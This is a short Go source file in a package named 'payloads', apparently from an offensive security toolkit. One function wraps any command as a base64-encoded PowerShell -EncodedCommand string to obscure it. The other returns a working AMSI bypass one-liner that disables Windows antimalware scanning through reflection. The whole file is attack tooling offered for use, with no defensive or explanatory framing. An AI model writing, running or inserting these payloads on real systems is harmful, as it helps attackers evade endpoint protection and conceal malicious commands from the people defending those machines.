package payloads

import "encoding/base64"

// PSEncodedCommand returns a base64-encoded PowerShell command.
func PSEncodedCommand(cmd string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(cmd))
	return `powershell -EncodedCommand ` + encoded
}

// PSAMSIBypass returns a basic AMSI bypass snippet.
func PSAMSIBypass() string {
	return `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
}
